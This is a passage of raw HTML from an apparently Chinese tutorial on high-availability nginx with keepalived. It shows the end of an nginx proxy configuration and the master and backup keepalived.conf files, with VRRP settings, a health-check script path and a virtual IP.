class=\"crayon-h\">\t\t\t</span><span class=\"crayon-p\">#nginx跟后端服务器连接超时时间(代理连接超时)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">proxy_connect</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-33\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-p\">#后端服务器数据回传时间(代理发送超时)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-34\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">proxy_send</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-35\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-p\">#连接成功后，后端服务器响应时间(代理接收超时)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">proxy_read</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-37\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">proxy_pass </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//localhost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-39\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">_</span>page<span class=\"crayon-h\">   </span><span class=\"crayon-cn\">500</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">502</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">503</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">504</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">50x.html</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">location</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">50x.html</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-42\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">root   </span><span class=\"crayon-v\">html</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-43\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a4986962589-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a4986962589-45\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p></p>\n<h3 id=\"h3_12\">3.5.2 主Keepalived配置</h3>\n<p>（1）修改11服务器的keepalived配置文件，vi /etc/keepalived/keepalived.conf</p>\n<p>（2）内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a346e6a9220606797\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n! Configuration File for keepalived\r\n#全局配置\r\nglobal_defs {\r\n   #keepalived切换的时候，发消息到指定的email，可配置多个email\r\n   notification_email {\r\n     feinik1@foxmail.com\r\n\t feinik2@foxmail.com\r\n   }\r\n   #通知邮件从哪个地址发出\r\n   notification_email_from feinik@foxmail.com\r\n   #通知邮件的smtp地址\r\n   smtp_server smtp.exmail.qq.com\r\n   #连接smtp服务器的超时时间，单位秒\r\n   smtp_connect_timeout 30\r\n   #Keepalived的机器标识，一个网络内保持唯一\r\n   router_id nginx-master\r\n}\r\n\r\n#执行脚本配置\r\nvrrp_script chk_nginx {\r\n\t#脚本所在路径\r\n    script \"/home/project/keepalived/check_nginx.sh\"\r\n\t#脚本执行间隔时间，秒\r\n    interval 2\r\n\t#优先级\r\n    weight 2\r\n}\r\n#keepalived实例配置\r\nvrrp_instance VI_1 {\r\n\t#指定实例的初始状态，MASTER或BACKUP两种状态，并且需要大写\r\n    state MASTER\r\n\t#实例绑定的网卡\r\n    interface ens33\r\n\t#虚拟路由标识，是一个数字，整个VRRP内唯一，如果keepalived配置了主备，需要相同\r\n    virtual_router_id 51\r\n\t#优先级，数值愈大，优先级越高\r\n    priority 100\r\n\t#MASTER与BACKUP之间同步检查的时间间隔，单位为秒\r\n    advert_int 1\r\n\t#通信验证\r\n    authentication {\r\n        auth_type PASS\r\n        auth_pass feinik\r\n    }\r\n\t#追踪外围脚本\r\n    track_script {\r\n\t    #这里配置vrrp_script的名称\r\n        chk_nginx\r\n    }\r\n\t#虚拟ip配置，可配置多个\r\n    virtual_ipaddress {\r\n        192.168.10.200\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6a9220606797-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6a9220606797-54\">54</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-1\"><span class=\"crayon-o\">!</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Configuration</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">keepalived</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-2\"><span class=\"crayon-p\">#全局配置</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-3\"><span class=\"crayon-e\">global_defs</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#keepalived切换的时候，发消息到指定的email，可配置多个email</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-5\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">notification_email</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-6\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">feinik1</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-7\"><span class=\"crayon-e\">\t </span><span class=\"crayon-v\">feinik2</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-8\"><span class=\"crayon-h\">   </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-9\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#通知邮件从哪个地址发出</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-10\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">notification_email_from </span><span class=\"crayon-v\">feinik</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">foxmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-11\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#通知邮件的smtp地址</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-12\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">smtp_server </span><span class=\"crayon-v\">smtp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">exmail</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">qq</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-13\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#连接smtp服务器的超时时间，单位秒</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-14\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">smtp_connect</span><span class=\"crayon-sy\">_</span>timeout<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-15\"><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#Keepalived的机器标识，一个网络内保持唯一</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-16\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">router_id </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">master</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-17\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-19\"><span class=\"crayon-p\">#执行脚本配置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-20\"><span class=\"crayon-e\">vrrp_script</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">chk_nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#脚本所在路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">script</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/home/project/keepalived/check_nginx.sh\"</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-23\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#脚本执行间隔时间，秒</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">interval</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-25\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#优先级</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-27\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-28\"><span class=\"crayon-p\">#keepalived实例配置</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-29\"><span class=\"crayon-e\">vrrp_instance</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">VI_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-30\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#指定实例的初始状态，MASTER或BACKUP两种状态，并且需要大写</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MASTER</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-32\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#实例绑定的网卡</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ens33</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-34\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#虚拟路由标识，是一个数字，整个VRRP内唯一，如果keepalived配置了主备，需要相同</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">virtual_router_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-36\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#优先级，数值愈大，优先级越高</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">priority</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-38\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#MASTER与BACKUP之间同步检查的时间间隔，单位为秒</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">advert_int</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-40\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#通信验证</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">authentication</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">auth_type </span><span class=\"crayon-e\">PASS</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-43\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">auth_pass </span><span class=\"crayon-i\">feinik</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-45\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#追踪外围脚本</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">track_script</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-47\"><span class=\"crayon-h\">\t    </span><span class=\"crayon-p\">#这里配置vrrp_script的名称</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">chk</span><span class=\"crayon-sy\">_</span>nginx</div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-50\"><span class=\"crayon-h\">\t</span><span class=\"crayon-p\">#虚拟ip配置，可配置多个</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">virtual_ipaddress</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-52\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">192.168.10.200</span></div><div class=\"crayon-line\" id=\"crayon-5a635a346e6a9220606797-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a346e6a9220606797-54\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0040 seconds] -->\r\n<p></p>\n<h3 id=\"h3_13\">3.5.3 备Keepalived配置</h3>\n<p>（1）修改12服务器的keepalived配置文件，vi /etc/keepalived/keepalived.conf</p>\n<p>（2）内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a346e6b0844775861\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n! Configuration File for keepalived\r\n#全局配置\r\nglobal_defs {\r\n   #keepalived切换的时候，发消息到指定的email，可配置多个email\r\n   notification_email {\r\n     feinik1@foxmail.com\r\n\t feinik2@foxmail.com\r\n   }\r\n   #通知邮件从哪个地址发出\r\n   notification_email_from feinik@foxmail.com\r\n   #通知邮件的smtp地址\r\n   smtp_server smtp.exmail.qq.com\r\n   #连接smtp服务器的超时时间，单位秒\r\n   smtp_connect_timeout 30\r\n   #Keepalived的机器标识，一个网络内保持唯一\r\n   router_id nginx-master\r\n}\r\n\r\n#执行脚本配置\r\nvrrp_script chk_nginx {\r\n\t#脚本所在路径\r\n    script \"/home/project/keepalived/check_nginx.sh\"\r\n\t#脚本执行间隔时间，秒\r\n    interval 2\r\n\t#优先级\r\n    weight 2\r\n}\r\n#keepalived实例配置\r\nvrrp_instance VI_1 {\r\n\t#指定实例的初始状态，MASTER或BACKUP两种状态，并且需要大写\r\n    state BACKUP\r\n\t#实例绑定的网卡\r\n    interface ens33\r\n\t#虚拟路由标识，是一个数字，整个VRRP内唯一，如果keepalived配置了主备，需要相同\r\n    virtual_router_id 51\r\n\t#优先级，数值愈大，优先级越高\r\n    priority 99\r\n\t#MASTER与BACKUP之间同步检查的时间间隔，单位为秒\r\n    advert_int 1\r\n\t#通信验证\r\n    authentication {\r\n        auth_type PASS\r\n        auth_pass feinik\r\n    }\r\n\t#追踪外围脚本\r\n    track_script {\r\n\t    #这里配置vrrp_script的名称\r\n        chk_nginx\r\n    }\r\n\t#虚拟ip配置，可配置多个\r\n    virtual_ipaddress {\r\n        192.168.10.200\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635a346e6b0844775861-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a346e6b0844775861-22\">22</div><div 